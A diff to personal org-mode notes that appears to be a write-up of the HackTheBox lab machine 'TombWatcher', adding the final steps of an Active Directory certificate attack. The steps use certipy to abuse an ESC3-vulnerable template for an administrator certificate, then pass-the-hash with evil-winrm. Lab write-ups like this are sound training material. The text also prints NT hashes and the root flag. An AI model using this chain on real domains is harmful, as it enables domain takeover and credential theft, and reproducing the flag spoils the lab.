@@ -1,5 +1,5 @@
 =
-tags: #windows #active-directory #ad
+tags: #windows #active-directory #ad #adcs #certipy
 
 ==
 
@@ -625,7 +625,46 @@ whenCreated                     : 11/16/2024 12:07:04 PM
 [*] Saving certificate and private key to 'cert_admin.pfx'
 [*] Wrote certificate and private key to 'cert_admin.pfx'
    #+end_src
-** request certificates as cert_admin user
+** back to the original certipy output for all certificates
+   the command from [[*certipy][this section]]
+   #+begin_src bat
+   certipy-ad find -u john -hashes :08c7fbb0121095c2ba13f4297b7ca355 -target 10.10.11.72
+   #+end_src
+   results in output which includes other certificates as well, one of which is a template
+   named =User= which is vulnerable to ESC3; it also has =Client Authenticating= as an EKU
+   #+begin_src 
+   certipy-ad req -u cert_admin -hashes :f87ebf0febd9c4095c68a88928755773 -target 10.10.11.72 -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\administrator'
+
+[*] Requesting certificate via RPC
+[*] Request ID is 7
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@tombwatcher.htb'
+[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+   #+end_src
+** now let's use the administrator cert
+   #+begin_src 
+   certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@tombwatcher.htb'
+[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
+[*] Using principal: 'administrator@tombwatcher.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
+   #+end_src
+** use evil-winrm and login as admin
+   #+begin_src 
+   evil-winrm -i 10.10.11.72 -u administrator -H f61db423bebe3328d33af26741afe5fc
+
+   ,*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+895d9a93bf7a58e96f13b05b23e626dc
+   #+end_src
 * learnings
   - the major one here of course is that it's not necessary to look for an interactive way to
     own these AD machines, and that PowerView is not the only way to do things.
